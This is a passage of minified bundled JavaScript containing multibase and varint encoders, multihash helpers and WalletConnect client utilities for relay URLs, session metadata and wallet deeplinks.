                        p++;
                    for (var g = c.repeat(r); p < s; ++p)
                        g += e.charAt(l[p]);
                    return g
                },
                decodeUnsafe: d,
                decode: function(e) {
                    var r = d(e);
                    if (r)
                        return r;
                    throw new Error("Non-".concat(t, " character"))
                }
            }
        };
        const nc = rc
          , oc = (new Uint8Array(0),
        e => {
            if (e instanceof Uint8Array && "Uint8Array" === e.constructor.name)
                return e;
            if (e instanceof ArrayBuffer)
                return new Uint8Array(e);
            if (ArrayBuffer.isView(e))
                return new Uint8Array(e.buffer,e.byteOffset,e.byteLength);
            throw new Error("Unknown type, must be binary type")
        }
        );
        class ic {
            constructor(e, t, r) {
                this.name = e,
                this.prefix = t,
                this.baseEncode = r
            }
            encode(e) {
                if (e instanceof Uint8Array)
                    return "".concat(this.prefix).concat(this.baseEncode(e));
                throw Error("Unknown type, must be binary type")
            }
        }
        class sc {
            constructor(e, t, r) {
                if (this.name = e,
                this.prefix = t,
                void 0 === t.codePointAt(0))
                    throw new Error("Invalid prefix character");
                this.prefixCodePoint = t.codePointAt(0),
                this.baseDecode = r
            }
            decode(e) {
                if ("string" === typeof e) {
                    if (e.codePointAt(0) !== this.prefixCodePoint)
                        throw Error("Unable to decode multibase string ".concat(JSON.stringify(e), ", ").concat(this.name, " decoder only supports inputs prefixed with ").concat(this.prefix));
                    return this.baseDecode(e.slice(this.prefix.length))
                }
                throw Error("Can only multibase decode strings")
            }
            or(e) {
                return cc(this, e)
            }
        }
        class ac {
            constructor(e) {
                this.decoders = e
            }
            or(e) {
                return cc(this, e)
            }
            decode(e) {
                const t = e[0]
                  , r = this.decoders[t];
                if (r)
                    return r.decode(e);
                throw RangeError("Unable to decode multibase string ".concat(JSON.stringify(e), ", only inputs prefixed with ").concat(Object.keys(this.decoders), " are supported"))
            }
        }
        const cc = (e, t) => new ac((0,
        k.A)((0,
        k.A)({}, e.decoders || {
            [e.prefix]: e
        }), t.decoders || {
            [t.prefix]: t
        }));
        class lc {
            constructor(e, t, r, n) {
                this.name = e,
                this.prefix = t,
                this.baseEncode = r,
                this.baseDecode = n,
                this.encoder = new ic(e,t,r),
                this.decoder = new sc(e,t,n)
            }
            encode(e) {
                return this.encoder.encode(e)
            }
            decode(e) {
                return this.decoder.decode(e)
            }
        }
        const uc = e => {
            let {name: t, prefix: r, encode: n, decode: o} = e;
            return new lc(t,r,n,o)
        }
          , dc = e => {
            let {prefix: t, name: r, alphabet: n} = e;
            const {encode: o, decode: i} = nc(n, r);
            return uc({
                prefix: t,
                name: r,
                encode: o,
                decode: e => oc(i(e))
            })
        }
          , hc = e => {
            let {name: t, prefix: r, bitsPerChar: n, alphabet: o} = e;
            return uc({
                prefix: r,
                name: t,
                encode: e => ( (e, t, r) => {
                    const n = "=" === t[t.length - 1]
                      , o = (1 << r) - 1;
                    let i = ""
                      , s = 0
                      , a = 0;
                    for (let c = 0; c < e.length; ++c)
                        for (a = a << 8 | e[c],
                        s += 8; s > r; )
                            s -= r,
                            i += t[o & a >> s];
                    if (s && (i += t[o & a << r - s]),
                    n)
                        for (; i.length * r & 7; )
                            i += "=";
                    return i
                }
                )(e, o, n),
                decode: e => ( (e, t, r, n) => {
                    const o = {};
                    for (let u = 0; u < t.length; ++u)
                        o[t[u]] = u;
                    let i = e.length;
                    for (; "=" === e[i - 1]; )
                        --i;
                    const s = new Uint8Array(i * r / 8 | 0);
                    let a = 0
                      , c = 0
                      , l = 0;
                    for (let u = 0; u < i; ++u) {
                        const t = o[e[u]];
                        if (void 0 === t)
                            throw new SyntaxError("Non-".concat(n, " character"));
                        c = c << r | t,
                        a += r,
                        a >= 8 && (a -= 8,
                        s[l++] = 255 & c >> a)
                    }
                    if (a >= r || 255 & c << 8 - a)
                        throw new SyntaxError("Unexpected end of data");
                    return s
                }
                )(e, o, n, t)
            })
        }
          , fc = uc({
            prefix: "\0",
            name: "identity",
            encode: e => (e => (new TextDecoder).decode(e))(e),
            decode: e => (e => (new TextEncoder).encode(e))(e)
        })
          , pc = hc({
            prefix: "0",
            name: "base2",
            alphabet: "01",
            bitsPerChar: 1
        })
          , gc = hc({
            prefix: "7",
            name: "base8",
            alphabet: "01234567",
            bitsPerChar: 3
        })
          , yc = dc({
            prefix: "9",
            name: "base10",
            alphabet: "0123456789"
        })
          , mc = hc({
            prefix: "f",
            name: "base16",
            alphabet: "0123456789abcdef",
            bitsPerChar: 4
        })
          , bc = hc({
            prefix: "F",
            name: "base16upper",
            alphabet: "0123456789ABCDEF",
            bitsPerChar: 4
        })
          , vc = hc({
            prefix: "b",
            name: "base32",
            alphabet: "abcdefghijklmnopqrstuvwxyz234567",
            bitsPerChar: 5
        })
          , wc = hc({
            prefix: "B",
            name: "base32upper",
            alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",
            bitsPerChar: 5
        })
          , Tc = hc({
            prefix: "c",
            name: "base32pad",
            alphabet: "abcdefghijklmnopqrstuvwxyz234567=",
            bitsPerChar: 5
        })
          , Ac = hc({
            prefix: "C",
            name: "base32padupper",
            alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",
            bitsPerChar: 5
        })
          , Ec = hc({
            prefix: "v",
            name: "base32hex",
            alphabet: "0123456789abcdefghijklmnopqrstuv",
            bitsPerChar: 5
        })
          , Pc = hc({
            prefix: "V",
            name: "base32hexupper",
            alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUV",
            bitsPerChar: 5
        })
          , Cc = hc({
            prefix: "t",
            name: "base32hexpad",
            alphabet: "0123456789abcdefghijklmnopqrstuv=",
            bitsPerChar: 5
        })
          , Sc = hc({
            prefix: "T",
            name: "base32hexpadupper",
            alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUV=",
            bitsPerChar: 5
        })
          , Ic = hc({
            prefix: "h",
            name: "base32z",
            alphabet: "ybndrfg8ejkmcpqxot1uwisza345h769",
            bitsPerChar: 5
        })
          , Bc = dc({
            prefix: "k",
            name: "base36",
            alphabet: "0123456789abcdefghijklmnopqrstuvwxyz"
        })
          , xc = dc({
            prefix: "K",
            name: "base36upper",
            alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        })
          , Oc = dc({
            name: "base58btc",
            prefix: "z",
            alphabet: "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
        })
          , _c = dc({
            name: "base58flickr",
            prefix: "Z",
            alphabet: "123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"
        })
          , Wc = hc({
            prefix: "m",
            name: "base64",
            alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
            bitsPerChar: 6
        })
          , Rc = hc({
            prefix: "M",
            name: "base64pad",
            alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
            bitsPerChar: 6
        })
          , kc = hc({
            prefix: "u",
            name: "base64url",
            alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",
            bitsPerChar: 6
        })
          , Mc = hc({
            prefix: "U",
            name: "base64urlpad",
            alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",
            bitsPerChar: 6
        })
          , Nc = Array.from("\ud83d\ude80\ud83e\ude90\u2604\ud83d\udef0\ud83c\udf0c\ud83c\udf11\ud83c\udf12\ud83c\udf13\ud83c\udf14\ud83c\udf15\ud83c\udf16\ud83c\udf17\ud83c\udf18\ud83c\udf0d\ud83c\udf0f\ud83c\udf0e\ud83d\udc09\u2600\ud83d\udcbb\ud83d\udda5\ud83d\udcbe\ud83d\udcbf\ud83d\ude02\u2764\ud83d\ude0d\ud83e\udd23\ud83d\ude0a\ud83d\ude4f\ud83d\udc95\ud83d\ude2d\ud83d\ude18\ud83d\udc4d\ud83d\ude05\ud83d\udc4f\ud83d\ude01\ud83d\udd25\ud83e\udd70\ud83d\udc94\ud83d\udc96\ud83d\udc99\ud83d\ude22\ud83e\udd14\ud83d\ude06\ud83d\ude44\ud83d\udcaa\ud83d\ude09\u263a\ud83d\udc4c\ud83e\udd17\ud83d\udc9c\ud83d\ude14\ud83d\ude0e\ud83d\ude07\ud83c\udf39\ud83e\udd26\ud83c\udf89\ud83d\udc9e\u270c\u2728\ud83e\udd37\ud83d\ude31\ud83d\ude0c\ud83c\udf38\ud83d\ude4c\ud83d\ude0b\ud83d\udc97\ud83d\udc9a\ud83d\ude0f\ud83d\udc9b\ud83d\ude42\ud83d\udc93\ud83e\udd29\ud83d\ude04\ud83d\ude00\ud83d\udda4\ud83d\ude03\ud83d\udcaf\ud83d\ude48\ud83d\udc47\ud83c\udfb6\ud83d\ude12\ud83e\udd2d\u2763\ud83d\ude1c\ud83d\udc8b\ud83d\udc40\ud83d\ude2a\ud83d\ude11\ud83d\udca5\ud83d\ude4b\ud83d\ude1e\ud83d\ude29\ud83d\ude21\ud83e\udd2a\ud83d\udc4a\ud83e\udd73\ud83d\ude25\ud83e\udd24\ud83d\udc49\ud83d\udc83\ud83d\ude33\u270b\ud83d\ude1a\ud83d\ude1d\ud83d\ude34\ud83c\udf1f\ud83d\ude2c\ud83d\ude43\ud83c\udf40\ud83c\udf37\ud83d\ude3b\ud83d\ude13\u2b50\u2705\ud83e\udd7a\ud83c\udf08\ud83d\ude08\ud83e\udd18\ud83d\udca6\u2714\ud83d\ude23\ud83c\udfc3\ud83d\udc90\u2639\ud83c\udf8a\ud83d\udc98\ud83d\ude20\u261d\ud83d\ude15\ud83c\udf3a\ud83c\udf82\ud83c\udf3b\ud83d\ude10\ud83d\udd95\ud83d\udc9d\ud83d\ude4a\ud83d\ude39\ud83d\udde3\ud83d\udcab\ud83d\udc80\ud83d\udc51\ud83c\udfb5\ud83e\udd1e\ud83d\ude1b\ud83d\udd34\ud83d\ude24\ud83c\udf3c\ud83d\ude2b\u26bd\ud83e\udd19\u2615\ud83c\udfc6\ud83e\udd2b\ud83d\udc48\ud83d\ude2e\ud83d\ude46\ud83c\udf7b\ud83c\udf43\ud83d\udc36\ud83d\udc81\ud83d\ude32\ud83c\udf3f\ud83e\udde1\ud83c\udf81\u26a1\ud83c\udf1e\ud83c\udf88\u274c\u270a\ud83d\udc4b\ud83d\ude30\ud83e\udd28\ud83d\ude36\ud83e\udd1d\ud83d\udeb6\ud83d\udcb0\ud83c\udf53\ud83d\udca2\ud83e\udd1f\ud83d\ude41\ud83d\udea8\ud83d\udca8\ud83e\udd2c\u2708\ud83c\udf80\ud83c\udf7a\ud83e\udd13\ud83d\ude19\ud83d\udc9f\ud83c\udf31\ud83d\ude16\ud83d\udc76\ud83e\udd74\u25b6\u27a1\u2753\ud83d\udc8e\ud83d\udcb8\u2b07\ud83d\ude28\ud83c\udf1a\ud83e\udd8b\ud83d\ude37\ud83d\udd7a\u26a0\ud83d\ude45\ud83d\ude1f\ud83d\ude35\ud83d\udc4e\ud83e\udd32\ud83e\udd20\ud83e\udd27\ud83d\udccc\ud83d\udd35\ud83d\udc85\ud83e\uddd0\ud83d\udc3e\ud83c\udf52\ud83d\ude17\ud83e\udd11\ud83c\udf0a\ud83e\udd2f\ud83d\udc37\u260e\ud83d\udca7\ud83d\ude2f\ud83d\udc86\ud83d\udc46\ud83c\udfa4\ud83d\ude47\ud83c\udf51\u2744\ud83c\udf34\ud83d\udca3\ud83d\udc38\ud83d\udc8c\ud83d\udccd\ud83e\udd40\ud83e\udd22\ud83d\udc45\ud83d\udca1\ud83d\udca9\ud83d\udc50\ud83d\udcf8\ud83d\udc7b\ud83e\udd10\ud83e\udd2e\ud83c\udfbc\ud83e\udd75\ud83d\udea9\ud83c\udf4e\ud83c\udf4a\ud83d\udc7c\ud83d\udc8d\ud83d\udce3\ud83e\udd42")
          , Fc = Nc.reduce(( (e, t, r) => (e[r] = t,
        e)), [])
          , Uc = Nc.reduce(( (e, t, r) => (e[t.codePointAt(0)] = r,
        e)), []);
        const Dc = uc({
            prefix: "\ud83d\ude80",
            name: "base256emoji",
            encode: function(e) {
                return e.reduce(( (e, t) => e += Fc[t]), "")
            },
            decode: function(e) {
                const t = [];
                for (const r of e) {
                    const e = Uc[r.codePointAt(0)];
                    if (void 0 === e)
                        throw new Error("Non-base256emoji character: ".concat(r));
                    t.push(e)
                }
                return new Uint8Array(t)
            }
        });
        var Lc = function e(t, r, n) {
            r = r || [];
            var o = n = n || 0;
            for (; t >= Vc; )
                r[n++] = 255 & t | jc,
                t /= 128;
            for (; t & zc; )
                r[n++] = 255 & t | jc,
                t >>>= 7;
            return r[n] = 0 | t,
            e.bytes = n - o + 1,
            r
        }
          , jc = 128
          , zc = -128
          , Vc = Math.pow(2, 31);
        var Hc = function e(t, r) {
            var n, o = 0, i = 0, s = r = r || 0, a = t.length;
            do {
                if (s >= a)
                    throw e.bytes = 0,
                    new RangeError("Could not decode varint");
                n = t[s++],
                o += i < 28 ? (n & Gc) << i : (n & Gc) * Math.pow(2, i),
                i += 7
            } while (n >= qc);
            return e.bytes = s - r,
            o
        }
          , qc = 128
          , Gc = 127;
        var $c = Math.pow(2, 7)
          , Kc = Math.pow(2, 14)
          , Zc = Math.pow(2, 21)
          , Yc = Math.pow(2, 28)
          , Jc = Math.pow(2, 35)
          , Xc = Math.pow(2, 42)
          , Qc = Math.pow(2, 49)
          , el = Math.pow(2, 56)
          , tl = Math.pow(2, 63);
        const rl = {
            encode: Lc,
            decode: Hc,
            encodingLength: function(e) {
                return e < $c ? 1 : e < Kc ? 2 : e < Zc ? 3 : e < Yc ? 4 : e < Jc ? 5 : e < Xc ? 6 : e < Qc ? 7 : e < el ? 8 : e < tl ? 9 : 10
            }
        }
          , nl = function(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
            return rl.encode(e, t, r),
            t
        }
          , ol = e => rl.encodingLength(e)
          , il = (e, t) => {
            const r = t.byteLength
              , n = ol(e)
              , o = n + ol(r)
              , i = new Uint8Array(o + r);
            return nl(e, i, 0),
            nl(r, i, n),
            i.set(t, o),
            new sl(e,r,t,i)
        }
        ;
        class sl {
            constructor(e, t, r, n) {
                this.code = e,
                this.size = t,
                this.digest = r,
                this.bytes = n
            }
        }
        const al = e => {
            let {name: t, code: r, encode: n} = e;
            return new cl(t,r,n)
        }
        ;
        class cl {
            constructor(e, t, r) {
                this.name = e,
                this.code = t,
                this.encode = r
            }
            digest(e) {
                if (e instanceof Uint8Array) {
                    const t = this.encode(e);
                    return t instanceof Uint8Array ? il(this.code, t) : t.then((e => il(this.code, e)))
                }
                throw Error("Unknown type, must be binary type")
            }
        }
        const ll = e => async t => new Uint8Array(await crypto.subtle.digest(e, t))
          , ul = al({
            name: "sha2-256",
            code: 18,
            encode: ll("SHA-256")
        })
          , dl = al({
            name: "sha2-512",
            code: 19,
            encode: ll("SHA-512")
        })
          , hl = oc
          , fl = {
            code: 0,
            name: "identity",
            encode: hl,
            digest: e => il(0, hl(e))
        }
          , pl = "raw"
          , gl = 85
          , yl = e => oc(e)
          , ml = e => oc(e)
          , bl = new TextEncoder
          , vl = new TextDecoder
          , wl = "json"
          , Tl = 512
          , Al = e => bl.encode(JSON.stringify(e))
          , El = e => JSON.parse(vl.decode(e));
        Symbol.toStringTag,
        Symbol.for("nodejs.util.inspect.custom");
        Symbol.for("@ipld/js-cid/CID");
        const Pl = (0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)({}, e), t), n), o), i), s), a), c), l), u);
        (0,
        k.A)((0,
        k.A)({}, d), h);
        function Cl(e, t, r, n) {
            return {
                name: e,
                prefix: t,
                encoder: {
                    name: e,
                    prefix: t,
                    encode: r
                },
                decoder: {
                    decode: n
                }
            }
        }
        const Sl = Cl("utf8", "u", (e => "u" + new TextDecoder("utf8").decode(e)), (e => (new TextEncoder).encode(e.substring(1))))
          , Il = Cl("ascii", "a", (e => {
            let t = "a";
            for (let r = 0; r < e.length; r++)
                t += String.fromCharCode(e[r]);
            return t
        }
        ), (e => {
            const t = ec((e = e.substring(1)).length);
            for (let r = 0; r < e.length; r++)
                t[r] = e.charCodeAt(r);
            return t
        }
        ))
          , Bl = (0,
        k.A)({
            utf8: Sl,
            "utf-8": Sl,
            hex: Pl.base16,
            latin1: Il,
            ascii: Il,
            binary: Il
        }, Pl);
        function xl(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "utf8";
            const r = Bl[t];
            if (!r)
                throw new Error('Unsupported encoding "'.concat(t, '"'));
            return "utf8" !== t && "utf-8" !== t || null == globalThis.Buffer || null == globalThis.Buffer.from ? r.decoder.decode("".concat(r.prefix).concat(e)) : Qa(globalThis.Buffer.from(e, "utf-8"))
        }
        function Ol(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "utf8";
            const r = Bl[t];
            if (!r)
                throw new Error('Unsupported encoding "'.concat(t, '"'));
            return "utf8" !== t && "utf-8" !== t || null == globalThis.Buffer || null == globalThis.Buffer.from ? r.encoder.encode(e).substring(1) : globalThis.Buffer.from(e.buffer, e.byteOffset, e.byteLength).toString("utf8")
        }
        function _l(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "string";
            if (!e[t] || typeof e[t] !== r)
                throw new Error('Missing or invalid "'.concat(t, '" param'))
        }
        const Wl = {
            waku: {
                publish: "waku_publish",
                batchPublish: "waku_batchPublish",
                subscribe: "waku_subscribe",
                batchSubscribe: "waku_batchSubscribe",
                subscription: "waku_subscription",
                unsubscribe: "waku_unsubscribe",
                batchUnsubscribe: "waku_batchUnsubscribe",
                batchFetchMessages: "waku_batchFetchMessages"
            },
            irn: {
                publish: "irn_publish",
                batchPublish: "irn_batchPublish",
                subscribe: "irn_subscribe",
                batchSubscribe: "irn_batchSubscribe",
                subscription: "irn_subscription",
                unsubscribe: "irn_unsubscribe",
                batchUnsubscribe: "irn_batchUnsubscribe",
                batchFetchMessages: "irn_batchFetchMessages"
            },
            iridium: {
                publish: "iridium_publish",
                batchPublish: "iridium_batchPublish",
                subscribe: "iridium_subscribe",
                batchSubscribe: "iridium_batchSubscribe",
                subscription: "iridium_subscription",
                unsubscribe: "iridium_unsubscribe",
                batchUnsubscribe: "iridium_batchUnsubscribe",
                batchFetchMessages: "iridium_batchFetchMessages"
            }
        };
        var Rl = r(5094);
        const kl = ":";
        function Ml(e) {
            const [t,r] = e.split(kl);
            return {
                namespace: t,
                reference: r
            }
        }
        function Nl(e, t) {
            return e.includes(":") ? [e] : t.chains || []
        }
        var Fl = Object.defineProperty
          , Ul = Object.defineProperties
          , Dl = Object.getOwnPropertyDescriptors
          , Ll = Object.getOwnPropertySymbols
          , jl = Object.prototype.hasOwnProperty
          , zl = Object.prototype.propertyIsEnumerable
          , Vl = (e, t, r) => t in e ? Fl(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r
          , Hl = (e, t) => {
            for (var r in t || (t = {}))
                jl.call(t, r) && Vl(e, r, t[r]);
            if (Ll)
                for (var r of Ll(t))
                    zl.call(t, r) && Vl(e, r, t[r]);
            return e
        }
        ;
        const ql = "react-native"
          , Gl = "node"
          , $l = "browser"
          , Kl = "unknown"
          , Zl = "js";
        function Yl() {
            return typeof process < "u" && typeof process.versions < "u" && typeof process.versions.node < "u"
        }
        function Jl() {
            return !(0,
            Hi.getDocument)() && !!(0,
            Hi.getNavigator)() && "ReactNative" === navigator.product
        }
        function Xl() {
            return !Yl() && !!(0,
            Hi.getNavigator)() && !!(0,
            Hi.getDocument)()
        }
        function Ql() {
            return Jl() ? ql : Yl() ? Gl : Xl() ? $l : Kl
        }
        function eu() {
            var e;
            try {
                return Jl() && typeof r.g < "u" && typeof (null == r.g ? void 0 : r.g.Application) < "u" ? null == (e = r.g.Application) ? void 0 : e.applicationId : void 0
            } catch (t) {
                return
            }
        }
        function tu(e) {
            var t, r;
            const n = ru();
            try {
                return null != e && e.url && n.url && new URL(e.url).host !== new URL(n.url).host && (console.warn("The configured WalletConnect 'metadata.url':".concat(e.url, " differs from the actual page url:").concat(n.url, ". This is probably unintended and can lead to issues.")),
                e.url = n.url),
                null != (t = null === e || void 0 === e ? void 0 : e.icons) && t.length && e.icons.length > 0 && (e.icons = e.icons.filter((e => "" !== e))),
                ( (e, t) => Ul(e, Dl(t)))(Hl(Hl({}, n), e), {
                    url: (null === e || void 0 === e ? void 0 : e.url) || n.url,
                    name: (null === e || void 0 === e ? void 0 : e.name) || n.name,
                    description: (null === e || void 0 === e ? void 0 : e.description) || n.description,
                    icons: null != (r = null === e || void 0 === e ? void 0 : e.icons) && r.length && e.icons.length > 0 ? e.icons : n.icons
                })
            } catch (o) {
                return console.warn("Error populating app metadata", o),
                e || n
            }
        }
        function ru() {
            return (0,
            qi.g)() || {
                name: "",
                description: "",
                url: "",
                icons: [""]
            }
        }
        function nu(e, t, n) {
            const o = function() {
                if (Ql() === ql && typeof r.g < "u" && typeof (null == r.g ? void 0 : r.g.Platform) < "u") {
                    const {OS: e, Version: t} = r.g.Platform;
                    return [e, t].join("-")
                }
                const e = ji();
                if (null === e)
                    return "unknown";
                const t = e.os ? e.os.replace(" ", "").toLowerCase() : "unknown";
                return "browser" === e.type ? [t, e.name, e.version].join("-") : [t, e.version].join("-")
            }()
              , i = function() {
                var e;
                const t = Ql();
                return t === $l ? [t, (null == (e = (0,
                Hi.getLocation)()) ? void 0 : e.host) || "unknown"].join(":") : t
            }();
            return [[e, t].join("-"), [Zl, n].join("-"), o, i].join("/")
        }
        function ou(e) {
            let {protocol: t, version: r, relayUrl: n, sdkVersion: o, auth: i, projectId: s, useOnCloseEvent: a, bundleId: c, packageName: l} = e;
            const u = n.split("?")
              , d = {
                auth: i,
                ua: nu(t, r, o),
                projectId: s,
                useOnCloseEvent: a || void 0,
                packageName: l || void 0,
                bundleId: c || void 0
            }
              , h = function(e, t) {
                const r = new URLSearchParams(e);
                for (const n of Object.keys(t).sort())
                    if (t.hasOwnProperty(n)) {
                        const e = t[n];
                        void 0 !== e && r.set(n, e)
                    }
                return r.toString()
            }(u[1] || "", d);
            return u[0] + "?" + h
        }
        function iu(e, t) {
            return e.filter((e => t.includes(e))).length === e.length
        }
        function su(e) {
            return Object.fromEntries(e.entries())
        }
        function au(e) {
            return new Map(Object.entries(e))
        }
        function cu() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : Be.FIVE_MINUTES
              , t = arguments.length > 1 ? arguments[1] : void 0;
            const r = (0,
            Be.toMiliseconds)(e || Be.FIVE_MINUTES);
            let n, o, i, s;
            return {
                resolve: e => {
                    i && n && (clearTimeout(i),
                    n(e),
                    s = Promise.resolve(e))
                }
                ,
                reject: e => {
                    i && o && (clearTimeout(i),
                    o(e))
                }
                ,
                done: () => new Promise(( (e, a) => {
                    if (s)
                        return e(s);
                    i = setTimeout(( () => {
                        const e = new Error(t);
                        s = Promise.reject(e),
                        a(e)
                    }
                    ), r),
                    n = e,
                    o = a
                }
                ))
            }
        }
        function lu(e, t, r) {
            return new Promise((async (n, o) => {
                const i = setTimeout(( () => o(new Error(r))), t);
                try {
                    n(await e)
                } catch (Ot) {
                    o(Ot)
                }
                clearTimeout(i)
            }
            ))
        }
        function uu(e, t) {
            if ("string" == typeof t && t.startsWith("".concat(e, ":")))
                return t;
            if ("topic" === e.toLowerCase()) {
                if ("string" != typeof t)
                    throw new Error('Value must be "string" for expirer target type: topic');
                return "topic:".concat(t)
            }
            if ("id" === e.toLowerCase()) {
                if ("number" != typeof t)
                    throw new Error('Value must be "number" for expirer target type: id');
                return "id:".concat(t)
            }
            throw new Error("Unknown expirer target type: ".concat(e))
        }
        function du(e) {
            const [t,r] = e.split(":")
              , n = {
                id: void 0,
                topic: void 0
            };
            if ("topic" === t && "string" == typeof r)
                n.topic = r;
            else {
                if ("id" !== t || !Number.isInteger(Number(r)))
                    throw new Error("Invalid target, expected id:number or topic:string, got ".concat(t, ":").concat(r));
                n.id = Number(r)
            }
            return n
        }
        function hu(e, t) {
            return (0,
            Be.fromMiliseconds)((t || Date.now()) + (0,
            Be.toMiliseconds)(e))
        }
        function fu(e) {
            return Date.now() >= (0,
            Be.toMiliseconds)(e)
        }
        function pu(e, t) {
            return "".concat(e).concat(t ? ":".concat(t) : "")
        }
        function gu() {
            return [...new Set([...arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : [], ...arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : []])]
        }
        async function yu(e) {
            let {id: t, topic: n, wcDeepLink: o} = e;
            var i;
            try {
                if (!o)
                    return;
                const e = "string" == typeof o ? JSON.parse(o) : o
                  , s = null === e || void 0 === e ? void 0 : e.href;
                if ("string" != typeof s)
                    return;
                const a = function(e, t, r) {
                    const n = "requestId=".concat(t, "&sessionTopic=").concat(r);
                    e.endsWith("/") && (e = e.slice(0, -1));
                    let o = "".concat(e);
                    if (e.startsWith("https://t.me")) {
                        const t = e.includes("?") ? "&startapp=" : "?startapp=";
                        o = "".concat(o).concat(t).concat(function(e) {
                            let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
                            const r = Buffer.from(e).toString("base64");
                            return t ? r.replace(/[=]/g, "") : r
                        }(n, !0))
                    } else
                        o = "".concat(o, "/wc?").concat(n);
                    return o
                }(s, t, n)
                  , c = Ql();
                if (c === $l) {
                    if (null == (i = (0,
                    Hi.getDocument)()) || !i.hasFocus())
                        return void console.warn("Document does not have focus, skipping deeplink.");
                    !function(e) {
                        let t = "_self";
                        !function() {
                            try {
                                return window.self !== window.top
                            } catch (e) {
                                return !1
                            }
                        }() ? (typeof window < "u" && (!!window.TelegramWebviewProxy || !!window.Telegram || !!window.TelegramWebviewProxyProto) || e.startsWith("https://") || e.startsWith("http://")) && (t = "_blank") : t = "_top",
                        window.open(e, t, "noreferrer noopener")
                    }(a)
                } else
                    c === ql && typeof (null == r.g ? void 0 : r.g.Linking) < "u" && await r.g.Linking.openURL(a)
            } catch (s) {
                console.error(s)
            }
        }
        function mu(e, t) {
            if (!e.includes(t))
                return null;
            const r = e.split(/([&,?,=])/)
              , n = r.indexOf(t);
            return r[n + 2]
        }
        function bu() {
            return typeof crypto < "u" && null != crypto && crypto.randomUUID ? crypto.randomUUID() : "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (e => {
                const t = 16 * Math.random() | 0;
                return ("x" === e ? t : 3 & t | 8).toString(16)
            }
            ))
        }
        function vu() {
            return typeof process < "u" && "true" === {
                NODE_ENV: "production",
                PUBLIC_URL: "",
                WDS_SOCKET_HOST: void 0,
                WDS_SOCKET_PATH: void 0,
                WDS_SOCKET_PORT: void 0,
                FAST_REFRESH: !0
            }.IS_VITEST
        }
        function wu(e) {
            return Buffer.from(e, "base64").toString("utf-8")
        }
        const Tu = BigInt(2 ** 32 - 1)
          , Au = BigInt(32);
        function Eu(e) {
            return arguments.length > 1 && void 0 !== arguments[1] && arguments[1] ? {
                h: Number(e & Tu),
                l: Number(e >> Au & Tu)
            } : {
                h: 0 | Number(e >> Au & Tu),
                l: 0 | Number(e & Tu)
            }
        }
        function Pu(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
            const r = e.length;
            let n = new Uint32Array(r)
              , o = new Uint32Array(r);
            for (let i = 0; i < r; i++) {
                const {h: r, l: s} = Eu(e[i], t);
                [n[i],o[i]] = [r, s]
            }
            return [n, o]
        }
        const Cu = (e, t, r) => e >>> r
          , Su = (e, t, r) => e << 32 - r | t >>> r
          , Iu = (e, t, r) => e >>> r | t << 32 - r
          , Bu = (e, t, r) => e << 32 - r | t >>> r
          , xu = (e, t, r) => e << 64 - r | t >>> r - 32
          , Ou = (e, t, r) => e >>> r - 32 | t << 64 - r
          , _u = (e, t) => t
          , Wu = (e, t) => e;
        function Ru(e, t, r, n) {
            const o = (t >>> 0) + (n >>> 0);
            return {
                h: e + r + (o / 2 ** 32 | 0) | 0,
                l: 0 | o
            }
        }
        const ku = (e, t, r) => (e >>> 0) + (t >>> 0) + (r >>> 0)
          , Mu = (e, t, r, n) => t + r + n + (e / 2 ** 32 | 0) | 0
          , Nu = (e, t, r, n) => (e >>> 0) + (t >>> 0) + (r >>> 0) + (n >>> 0)
          , Fu = (e, t, r, n, o) => t + r + n + o + (e / 2 ** 32 | 0) | 0
          , Uu = (e, t, r, n, o) => (e >>> 0) + (t >>> 0) + (r >>> 0) + (n >>> 0) + (o >>> 0)
          , Du = (e, t, r, n, o, i) => t + r + n + o + i + (e / 2 ** 32 | 0) | 0
          , Lu = "object" == typeof globalThis && "crypto"in globalThis ? globalThis.crypto : void 0;
        function ju(e) {
            if (!Number.isSafeInteger(e) || e < 0)
                throw new Error("positive integer expected, got " + e)
        }
        function zu(e) {
            if (!function(e) {
                return e instanceof Uint8Array || ArrayBuffer.isView(e) && "Uint8Array" === e.constructor.name
            }(e))
                throw new Error("Uint8Array expected");
            for (var t = arguments.length, r = new Array(t > 1 ? t - 1 : 0), n = 1; n < t; n++)
                r[n - 1] = arguments[n];
            if (r.length > 0 && !r.includes(e.length))
                throw new Error("Uint8Array expected of length " + r + ", got length=" + e.length)
        }
        function Vu(e) {
            if ("function" != typeof e || "function" != typeof e.create)
                throw new Error("Hash should be wrapped by utils.createHasher");
            ju(e.outputLen),
            ju(e.blockLen)
        }
        function Hu(e) {
            let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
            if (e.destroyed)
                throw new Error("Hash instance has been destroyed");
            if (t && e.finished)
                throw new Error("Hash#digest() has already been called")
        }
